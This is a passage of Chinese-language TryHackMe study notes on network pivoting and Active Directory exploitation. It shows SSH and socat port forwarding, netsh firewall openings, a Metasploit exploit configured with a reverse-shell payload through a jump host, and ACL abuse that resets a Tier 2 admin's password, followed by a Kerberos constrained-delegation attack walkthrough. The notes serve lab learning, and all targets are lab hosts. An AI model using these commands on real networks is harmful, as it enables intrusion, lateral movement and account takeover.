<span class="line"><span style="color: #61AFEF">useradd</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">tunneluser</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-m</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-d</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">/home/tunneluser</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-s</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">/bin/</span><span style="color: #D19A66">true</span></span>
<span class="line"><span style="color: #61AFEF">passwd</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">tunneluser</span></span></code></pre></div></div></figure>

<h4 id="SSH-远程端口转发"><a href="#SSH-远程端口转发" class="headerlink" title="SSH 远程端口转发"></a>SSH 远程端口转发</h4><p>即把远程端口转移到本地，本地主动发起连接。</p>
<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/49401a0687c38a1ce78fdd5852aca5a7.png" alt="SSH remote port forwarding" data-caption="SSH remote port forwarding" loading="lazy"></p>
<figure class="shiki sh"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic"># 1.1.1.1 是攻击机的 IP</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># 3389:3.3.3.3:3389 攻击机端口:目的机器IP:目的端口</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># -N 是不请求 shell</span></span>
<span class="line"><span style="color: #61AFEF">ssh</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">tunneluser@1.1.1.1</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-R</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">3389</span><span style="color: #98C379">:3.3.3.3:3389</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-N</span></span></code></pre></div></div></figure>

<h4 id="SSH-本地端口转发"><a href="#SSH-本地端口转发" class="headerlink" title="SSH 本地端口转发"></a>SSH 本地端口转发</h4><p>把本地端口转移到对面，对面主动发起连接。</p>
<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/23c086c89a5bbe2fa364c95064235fb5.png" alt="SSH Local Port Forwarding" data-caption="SSH Local Port Forwarding" loading="lazy"></p>
<figure class="shiki sh"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic"># *:80 监听所有网络接口的 80 端口</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># 127.0.0.1:80 是攻击机的的本地回环地址和端口</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># 也可以这样 192.168.244.1:8080 这样就转发到了攻击机的内网的机器上了</span></span>
<span class="line"><span style="color: #61AFEF">ssh</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">tunneluser@1.1.1.1</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-L</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">*</span><span style="color: #98C379">:80:127.0.0.1:80</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-N</span></span>
<span class="line"></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># 因为开了一个 80 的监听端口，防火墙策略也要放开</span></span>
<span class="line"><span style="color: #61AFEF">netsh</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">advfirewall</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">firewall</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">add</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">rule</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">name=&quot;Open Port 80&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">dir=in</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">action=allow</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">protocol=TCP</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">localport=</span><span style="color: #D19A66">80</span></span></code></pre></div></div></figure>

<h3 id="socat-端口转发"><a href="#socat-端口转发" class="headerlink" title="socat 端口转发"></a>socat 端口转发</h3><figure class="shiki sh"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic"># 监听本地 1234 端口 把流量都转发到 1.1.1.1:4321 去</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># fork 选项允许为每个收到的连接分叉一个新进程</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># 如果不带这个参数一次连接就会断开了</span></span>
<span class="line"><span style="color: #61AFEF">socat</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">TCP4-LISTEN:1234,fork</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">TCP4:1.1.1.1:4321</span></span>
<span class="line"></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># 转发内网机器3.3.3.3的 3389 端口暴露到本地 3389 端口</span></span>
<span class="line"><span style="color: #61AFEF">socat</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">TCP4-LISTEN:3389,fork</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">TCP4:3.3.3.3:3389</span></span>
<span class="line"></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># 添加防火墙规则</span></span>
<span class="line"><span style="color: #61AFEF">netsh</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">advfirewall</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">firewall</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">add</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">rule</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">name=&quot;Open Port 3389&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">dir=in</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">action=allow</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">protocol=TCP</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">localport=</span><span style="color: #D19A66">3389</span></span></code></pre></div></div></figure>

<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/d7128a0e5d344785ed570c2b8b90c775.png" alt="SOCAT port forwarding 1" data-caption="SOCAT port forwarding 1" loading="lazy"></p>
<h3 id="动态端口转发和-SOCKS"><a href="#动态端口转发和-SOCKS" class="headerlink" title="动态端口转发和 SOCKS"></a>动态端口转发和 SOCKS</h3><p>其实这个有点误解人，我不太理解他的意思，看起来好像 SSH 自动开了一个 SOCKS 服务端一样，我也没有去尝试他。</p>
<figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">ssh tunneluser@1.1.1.1 -R 9050 -N</span></span></code></pre></div></div></figure>

<h3 id="RDP-转发实践"><a href="#RDP-转发实践" class="headerlink" title="RDP 转发实践"></a>RDP 转发实践</h3><figure class="shiki cmd"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">ssh </span><span style="color: #E06C75">za</span><span style="color: #ABB2BF">\\terence.lloyd@thmjmp2.za.tryhackme.com</span></span>
<span class="line"></span>
<span class="line"><span style="color: #ABB2BF">C:\</span><span style="color: #E06C75">tools</span><span style="color: #ABB2BF">\</span><span style="color: #E06C75">socat</span><span style="color: #ABB2BF">\</span><span style="color: #E06C75">socat</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">TCP4</span><span style="color: #ABB2BF">-</span><span style="color: #E06C75">LISTEN</span><span style="color: #ABB2BF">:</span><span style="color: #D19A66">13389</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75">fork</span><span style="color: #ABB2BF"> TCP4:THMIIS.za.tryhackme.com:</span><span style="color: #D19A66">3389</span></span></code></pre></div></div></figure>

<h3 id="隧道复杂利用"><a href="#隧道复杂利用" class="headerlink" title="隧道复杂利用"></a>隧道复杂利用</h3><figure class="shiki sh"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic"># SSH 端口转发</span></span>
<span class="line"><span style="color: #61AFEF">ssh</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">tunneluser@10.50.46.241</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-R</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">8888</span><span style="color: #98C379">:thmdc.za.tryhackme.com:80</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-L</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">*</span><span style="color: #98C379">:6666:127.0.0.1:6666</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-L</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">*</span><span style="color: #98C379">:7878:127.0.0.1:7878</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-N</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># 开启 SSH 服务</span></span>
<span class="line"><span style="color: #61AFEF">sudo</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">systemctl</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">start</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">ssh</span></span></code></pre></div></div></figure>

<p>执行 RCE</p>
<figure class="shiki sh"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #61AFEF">msfconsole</span></span>
<span class="line"><span style="color: #61AFEF">use</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">rejetto_hfs_exec</span></span>
<span class="line"><span style="color: #56B6C2">set</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">payload</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">windows/shell_reverse_tcp</span></span>
<span class="line"></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># 小马要在远端机器上访问的地址</span></span>
<span class="line"><span style="color: #56B6C2">set</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">lhost</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">thmjmp2.za.tryhackme.com</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># 强制监听地址是 127.0.0.1 如果不填的话，就是 LHOST 的值</span></span>
<span class="line"><span style="color: #56B6C2">set</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">ReverseListenerBindAddress</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">127.0</span><span style="color: #98C379">.0.1</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># 跳板机 7878 端口转发到我们本地 7878 端口</span></span>
<span class="line"><span style="color: #56B6C2">set</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">lport</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">7878</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># Payload 监听地址</span></span>
<span class="line"><span style="color: #56B6C2">set</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">srvhost</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">127.0</span><span style="color: #98C379">.0.1</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># Payload 监听端口 http://thmjmp2.za.tryhackme.com:6666/4pdqhjQTjbrGJW</span></span>
<span class="line"><span style="color: #56B6C2">set</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">srvport</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">6666</span></span>
<span class="line"></span>
<span class="line"><span style="color: #56B6C2">set</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">rhosts</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">127.0</span><span style="color: #98C379">.0.1</span></span>
<span class="line"><span style="color: #56B6C2">set</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">rport</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">8888</span></span>
<span class="line"><span style="color: #61AFEF">exploit</span></span></code></pre></div></div></figure>

<h2 id="拓展"><a href="#拓展" class="headerlink" title="拓展"></a>拓展</h2><ul>
<li><a target="_blank" rel="noopener" href="https://github.com/sshuttle/sshuttle">Sshuttle</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/klsecservices/rpivot">Rpivot</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/jpillora/chisel">Chisel</a></li>
<li><a target="_blank" rel="noopener" href="https://adepts.of0x.cc/shadowmove-hijack-socket/">Hijacking Sockets with Shadowmove</a></li>
</ul>
<hr>
<h1 id="Exploiting-Active-Directory"><a href="#Exploiting-Active-Directory" class="headerlink" title="Exploiting Active Directory"></a>Exploiting Active Directory</h1><p>房间：<a target="_blank" rel="noopener" href="https://tryhackme.com/room/exploitingad">https://tryhackme.com/room/exploitingad</a></p>
<p>时间：20250804 23:30 - 20250806 03:50 </p>
<hr>
<h2 id="Exploiting-Permission-Delegation"><a href="#Exploiting-Permission-Delegation" class="headerlink" title="Exploiting Permission Delegation"></a>Exploiting Permission Delegation</h2><p>Active Directory 通过一个名为<strong>权限委派 (Permission Delegation)</strong> 的功能来委派权限和特权。一般只有很少的用户拥有 DA（域管理员）凭据的访问权限。不可能让他们处理所有来自用户的请求，例如重置他们的密码。通过使用委派，我们可以将强制更改用户密码的权限委派给 IT 服务台团队，这意味着他们现在对这个特定功能拥有了委派的特权。原则上，为了保证委派的安全性，应该遵循<strong>最小权限原则</strong>。</p>
<p>权限委派漏洞通常被称为 ACL-based attacks (基于 ACL 的攻击)。AD 允许管理员配置访问控制条目 (ACEs)，这些条目构成了自由访问控制列表 (DACLs)，因此得名 ACL-based attacks。几乎任何 AD 对象都可以通过 ACEs 进行安全保护，这些 ACEs 描述了其他 AD 对象对该目标对象拥有的允许和拒绝的权限。</p>
<p>如果 ACEs 配置错误，攻击者就可以从他们下手。如果 IT 支持团队被授予了对 <strong>Domain Users</strong>（域用户）组的 <strong>ForceChangePassword</strong>（强制更改密码）权限，这将被视为不安全的。虽然他们能够重置忘记密码的员工的密码，但这种配置错误也可能让他们重置特权账户的密码，比如那些属于 <strong>Domain Admins</strong>（域管理员）组的账户，从而<strong>实现权限提升</strong>。</p>
<h3 id="ACEs"><a href="#ACEs" class="headerlink" title="ACEs"></a>ACEs</h3><p>大量的 ACEs 可能会被错误的配置，然后他们的利用方式也很多，Bloodhound 的文档可以帮助解释被枚举出来的 ACEs 以及如何利用它们。以下是几个典型的</p>
<ul>
<li><p><strong>ForceChangePassword:</strong> 我们能在不知道用户密码的情况下重置密码</p>
</li>
<li><p><strong>AddMembers:</strong> 我们有将用户（包括当前用户），组和计算机加入目标组的权限。</p>
</li>
<li><p><strong>GenericAll:</strong> 我们可以完全控制该对象，包括更改用户密码、注册 SPN 或向目标组添加 AD 对象。</p>
</li>
<li><p><strong>GenericWrite:</strong> 我们可以更新目标对象的任何非保护参数。例如，这可以让我们更新 scriptPath 参数，从而在用户下次登录时执行脚本。</p>
<ul>
<li><p>“非保护参数”（non-protected parameters）指的是那些<strong>不会被 AdminSDHolder 机制保护的属性</strong>。</p>
<p>简单来说，Active Directory 有一套内置的安全机制，叫做 AdminSDHolder，专门用来保护高权限账户和组（如 Domain Admins）。这个机制会定期检查这些高权限对象，并强制重置它们的 ACL，以防止权限被错误修改。</p>
</li>
</ul>
</li>
<li><p><strong>WriteOwner:</strong> 我们可以更新目标对象的所有者。我们可以让自己成为所有者，从而获得对该对象的更多权限。</p>
</li>
<li><p><strong>WriteDACL:</strong> 我们可以向目标对象的 DACL 写入新的 ACE。例如，我们可以编写一个 ACE，授予我们的账户对目标对象的完全控制权。</p>
</li>
<li><p><strong>AllExtendedRights:</strong> 我们可以对目标对象执行任何与扩展 AD 权限相关的操作。例如，这包括强制更改用户密码的功能。</p>
</li>
</ul>
<p>为了利用这些 ACE，我们需要一种与 AD 交互的方法来发出这些请求。这方面的两个最佳选择是 AD-RSAT PowerShell cmdlets 或 PowerSploit。根据漏洞和环境中的检测工具，其中一种方法可能更隐蔽。在本任务中，我们将展示这两种方法。</p>
<h3 id="Bloodhound-1"><a href="#Bloodhound-1" class="headerlink" title="Bloodhound"></a>Bloodhound</h3><p>因为我用的是提供执行好的文件，就没有自己跑 Sharphound 了，把结果导入 Bloodhound 后，搜索拿到的用户名。</p>
<p>在 Node Info -&gt; EXECUTION RIGHTS -&gt; Group Delegated RDP Privileges 看到 DOMAIN USERS 有能访问 THMWRK1 的 <code>RDP</code> 权限。</p>
<p>然后在 Node Info -&gt; OUTBOUND CONTROL RIGHTS -&gt; Group Delegated Object 看到 DOMAIN USERS 有对 IT SUPPORT 的 <code>GenericWrite</code> 权限。</p>
<p>然后我们一般是要拿到高权限用户的权限，所以用 BloodHound 的检索功能，把自己的账户放到首位，<code>TIER 2 ADMINS@ZA.TRYHACKME.LOC</code> 放到目标，生成一个图出来。</p>
<img src="/thm_ad/image-20250805011844795.png" class="" title="image-20250805011844795">

<p>可以看到我们的用户组有对 IT SUPPORT 的 <code>GenericWrite</code> 权限，然后 IT SUPPORT 组有对 T2 组的强制改密码权限。当一个用户对一个组拥有 <code>GenericWrite</code> 权限时，就意味着他可以修改这个组的任何属性，包括 <code>member</code> 属性。</p>
<h4 id="AddMember"><a href="#AddMember" class="headerlink" title="AddMember"></a>AddMember</h4><p>我们会用 AD-RSAT 工具集中的 <code>Add-ADGroupMember</code> PowerShell cmdlet 实现这个功能。</p>
<figure class="shiki powershell"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic"># 把我们的用户加入 IT Support 组</span></span>
<span class="line"><span style="color: #56B6C2">Add-ADGroupMember</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;IT Support&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Members </span><span style="color: #98C379">&quot;barbara.reid&quot;</span></span>
<span class="line"></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># 查看 IT Support 组成员</span></span>
<span class="line"><span style="color: #56B6C2">Get-ADGroupMember</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Identity </span><span style="color: #98C379">&quot;IT Support&quot;</span></span></code></pre></div></div></figure>

<h4 id="强制改密码"><a href="#强制改密码" class="headerlink" title="强制改密码"></a>强制改密码</h4><p>现在我们的账户已经是 IT Support 组成员了，所以有对 Tier 2 组改密码的权限。</p>
<figure class="shiki powershell"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic"># 查看 T2 管理员组成员 找一个受害者</span></span>
<span class="line"><span style="color: #56B6C2">Get-ADGroupMember</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Identity </span><span style="color: #98C379">&quot;Tier 2 Admins&quot;</span></span>
<span class="line"></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># 新建密码变量</span></span>
<span class="line"><span style="color: #E06C75">$Password</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">ConvertTo-SecureString</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;Pass123...&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">AsPlainText </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Force </span></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># 更改密码</span></span>
<span class="line"><span style="color: #56B6C2">Set-ADAccountPassword</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Identity </span><span style="color: #98C379">&quot;t2_melanie.davies&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Reset </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">NewPassword </span><span style="color: #E06C75">$Password</span><span style="color: #ABB2BF"> </span></span>
<span class="line"></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># 如果提示拒绝，执行这个断开连接再连接</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># 还不行就等 10 分钟左右</span></span>
<span class="line"><span style="color: #ABB2BF">gpupdate </span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">force</span></span></code></pre></div></div></figure>

<h2 id="Exploiting-Kerberos-Delegation"><a href="#Exploiting-Kerberos-Delegation" class="headerlink" title="Exploiting Kerberos Delegation"></a>Exploiting Kerberos Delegation</h2><h3 id="Kerberos-Double-Hop-issue"><a href="#Kerberos-Double-Hop-issue" class="headerlink" title="Kerberos Double Hop issue"></a>Kerberos Double Hop issue</h3><p>客户端希望使用 Kerberos 对第一台服务器（Hop 1）进行身份验证，而第一台服务器需要代表客户端访问第二台服务器（Hop 2）上的资源。常见的情况是用户访问前端应用程序时需要修改数据库服务器上的资源。</p>
<p>原始的 Kerberos 无法告诉第一台服务器：”OK，你可以访问服务器上的资源了： “您可以代表客户访问第 2 服务器上的资源。”</p>
<h4 id="原始-Kerberos-协议的局限性"><a href="#原始-Kerberos-协议的局限性" class="headerlink" title="原始 Kerberos 协议的局限性"></a>原始 Kerberos 协议的局限性</h4><p>原始 Kerberos 协议的流程是这样的：</p>
<ol>
<li><strong>用户</strong>向 <strong>KDC (密钥分发中心)</strong> 证明自己的身份，并获得一个 <strong>TGT (票据授权票据)</strong>。</li>
<li><strong>用户</strong>使用这个 TGT 向 KDC 请求一个专门用于访问 <strong>Hop 1 服务器</strong>的 <strong>TGS (服务票据)</strong>。</li>
<li><strong>用户</strong>使用这个 TGS 向 <strong>Hop 1 服务器</strong>进行身份验证，并开始通信。</li>
</ol>
<p>到这里，整个流程就结束了。Kerberos 的设计只考虑了客户端（用户）和第一个服务器（Hop 1）之间的通信。</p>
<h4 id="为什么不能简单地转发-TGS？"><a href="#为什么不能简单地转发-TGS？" class="headerlink" title="为什么不能简单地转发 TGS？"></a>为什么不能简单地转发 TGS？</h4><ul>
<li><strong>TGS 的加密机制</strong>：用户从 KDC 获得的 TGS 是用 <strong>Hop 1 服务器的密钥</strong>加密的。只有 Hop 1 服务器能解密它，并从中获得会话密钥。</li>
<li><strong>无法将 TGS 转发给 Hop 2</strong>：Hop 2 服务器无法解密这个 TGS，因为它没有 Hop 1 服务器的密钥。因此，用户不能简单地将 TGS 转发给 Hop 2。</li>
<li><strong>权限绑定</strong>：TGS 明确绑定了<strong>一个用户</strong>和<strong>一个特定服务</strong>。它不包含任何“代表他人”去访问其他服务的权限。原始协议没有“委托（delegation）”的概念。</li>
</ul>
<h4 id="解决方案：Kerberos-委派（Kerberos-Delegation）"><a href="#解决方案：Kerberos-委派（Kerberos-Delegation）" class="headerlink" title="解决方案：Kerberos 委派（Kerberos Delegation）"></a>解决方案：Kerberos 委派（Kerberos Delegation）</h4><p>为了解决这个问题，微软和其他组织对 Kerberos 协议进行了扩展，引入了 <strong>Kerberos 委派</strong>的功能。</p>
<p>委派的核心思想是允许<strong>服务</strong>（例如 Hop 1 服务器）以<strong>用户的身份</strong>去向 KDC 请求一个新的 TGS，这个新的 TGS 是专门用于访问<strong>其他服务</strong>（例如 Hop 2 服务器）的。</p>
<p>这就是为什么现在有<strong>非约束性委派 (Unconstrained Delegation)</strong> 和<strong>约束性委派 (Constrained Delegation)</strong> 等多种委派形式。它们都是对原始 Kerberos 协议的增强，专门用于处理多跳的身份验证场景。</p>
<h3 id="Constrained-vs-Unconstrained"><a href="#Constrained-vs-Unconstrained" class="headerlink" title="Constrained vs Unconstrained"></a>Constrained vs Unconstrained</h3><p>Kerberos 委派有两种类型。在 Kerberos 委派最初的实现中，使用了<strong>非约束性委派 (Unconstrained Delegation)</strong>，这是最不安全的方法。</p>
<p>本质上，非约束性委派对委派没有施加任何限制。它的后台工作原理是：如果一个设置了 <code>TRUSTED_FOR_DELEGATION</code> 标志的用户在一个配置了非约束性委派的主机上进行身份验证，那么就会为这个用户账户生成一个 <strong>TGT</strong>，并将其存储在主机的内存中，以便将来需要时使用。</p>
<p>假设攻击者能够攻陷一个启用了非约束性委派的主机，他们就可以尝试强制一个特权账户（如域管理员）向该主机进行身份验证，这使他们能够拦截生成的 TGT，并冒充这个特权服务。如果你想看一个非约束性委派利用的例子，可以看<a target="_blank" rel="noopener" href="https://medium.com/@riccardo.ancarani94/exploiting-unconstrained-delegation-a81eabbd6976">这里</a>。</p>
<p>为了克服无约束委托的安全缺陷，微软在 2003 年推出了受限委托。受限委托限制了账户可以委托给哪些服务，从而在账户受到威胁时限制了风险。以下是可配置授权的服务示例：</p>
<ul>
<li>HTTP - 用于 Web 应用程序，允许使用 AD 凭据进行<strong>直通式（pass-through）身份验证</strong>。</li>
<li>CIFS - <strong>Common Internet File System</strong>，用于文件共享，允许将用户委派到文件共享。</li>
<li>LDAP - 用于委派给 LDAP 服务，执行诸如<strong>重置用户密码</strong>之类的操作。</li>
<li>HOST - 允许将账户委派给主机上的<strong>所有活动</strong>。</li>
<li>MSSQL - 允许将用户账户委派给 SQL 服务，以进行数据库的<strong>直通式身份验证</strong>。</li>
</ul>
<p>利用约束性委派通常比利用非约束性委派更复杂，因为被委派的账户不能被用于访问所有东西。如果我们能拿到一个有约束性委派的 AD 账户的话。知道他的明文密码甚至他的 NTLM hash，我们能生成这个账户的 TGT。然后我们可以使用这个 TGT 来为<strong>任何非敏感的用户账户</strong>执行一个 TGS 请求，以便<strong>以该用户的身份</strong>访问服务。</p>
<p>整个过程简单说是这样的：</p>
<ul>
<li><strong>攻击者</strong>：掌握了<strong>服务账户</strong>的密码。</li>
<li><strong>攻击者</strong>利用这个服务账户的权限，<strong>伪造</strong>一个代表<strong>用户 A</strong>的票据。</li>
<li><strong>攻击者</strong>使用这个伪造的票据，去向 KDC 申请一个<strong>冒充用户 A</strong>访问<strong>服务 B</strong>的票据。</li>
</ul>
<h4 id="冒充过程（攻击流程）"><a href="#冒充过程（攻击流程）" class="headerlink" title="冒充过程（攻击流程）"></a>冒充过程（攻击流程）</h4><p>这个过程是利用了 Kerberos 的两个扩展协议：<code>S4U2self</code> 和 <code>S4U2proxy</code>。攻击者在拥有了配置了约束性委派的服务账户凭据（密码或 NTLM 哈希）后，可以执行以下步骤：</p>
<ol>
<li><p><strong>生成服务账户的 TGT</strong>： 攻击者首先使用窃取的服务账户的凭据（密码或 NTLM 哈希），向 KDC（密钥分发中心）请求一个该服务账户的 TGT。有了这个 TGT，攻击者就完全拥有了这个服务账户的身份。</p>
</li>
<li><p><strong>执行 S4U2self 请求（伪造身份）</strong>： 攻击者现在以被攻陷的<strong>服务账户</strong>的身份，向 KDC 发出请求。这个请求的目的是**“代表”<strong>另一个</strong>用户 A**（即你说的“非敏感用户账户”），向 KDC 请求一个服务票据（TGS），但这个 TGS 是用于访问<strong>自己（服务账户本身）<strong>的。KDC 看到这个请求后，会检查服务账户是否被</strong>信任</strong>用于委派（即是否设置了<code>TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION</code> 标志）。如果设置了，KDC 会信任这个请求，并为<strong>用户 A</strong>生成一个有效的、可转发的 TGS。这个 TGS 相当于 KDC 认可的一个**“用户 A 的身份凭证”**。</p>
</li>
<li><p><strong>执行 S4U2proxy 请求（冒充访问）</strong>： 攻击者拿到上一步获得的**“用户 A 的身份凭证”<strong>后，再次向 KDC 发出请求。这次的请求是希望以</strong>用户 A<strong>的身份，去访问一个</strong>被约束性委派允许访问的服务 B**（例如，一个敏感数据库）。KDC 收到这个请求后，会进行严格的检查：</p>
<ul>
<li>检查该服务账户是否被允许代表用户去访问<strong>服务 B</strong>。</li>
<li>这个检查是通过查看服务账户的 <code>msDS-AllowedToDelegateTo</code> 属性中是否包含服务 B 的 SPN。</li>
</ul>
<p>如果检查通过，KDC 就会为攻击者（以服务账户的身份）颁发一个 TGS，这个 TGS 明确表示攻击者现在可以以<strong>用户 A</strong>的身份去访问<strong>服务 B</strong>。</p>
</li>
<li><p><strong>访问目标服务</strong>： 攻击者使用这个 TGS，就可以冒充<strong>用户 A</strong>，去访问敏感数据库，并执行用户 A 有权限的任何操作。</p>
</li>
</ol>
